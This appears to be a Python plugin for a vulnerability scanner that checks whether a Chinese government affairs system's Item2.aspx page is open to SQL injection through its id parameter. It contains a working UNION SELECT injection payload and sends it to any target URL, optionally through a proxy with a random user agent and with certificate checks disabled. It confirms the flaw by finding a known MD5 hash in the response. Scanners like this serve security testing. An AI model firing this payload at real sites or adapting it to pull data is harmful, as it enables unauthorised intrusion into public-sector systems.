#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 农友政务系统Item2.aspx SQL注入
referer: http://wooyun.org/bugs/wooyun-2010-0120498
author: Lucifer
description: 文件/newsymItemView/Item2.aspx中,参数id存在SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/newsymItemView/Item2.aspx?id=021973%27UnIoN%20AlL%20SeLeCt%20NuLl%2CNuLl%2CNuLl%2CNuLl%2CNuLl%2CNuLl%2CNuLl%2CCoNcAt%28Md5%281234%29%29%2CNuLl%2CNuLl%23"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2
    try:
        payload_url = scheme+"://"+url+payload
        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': '*/*',
            'User-Agent': RandomAgent,
        }
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
            Medusa = "{} 存在农友政务系统Item2.aspx SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass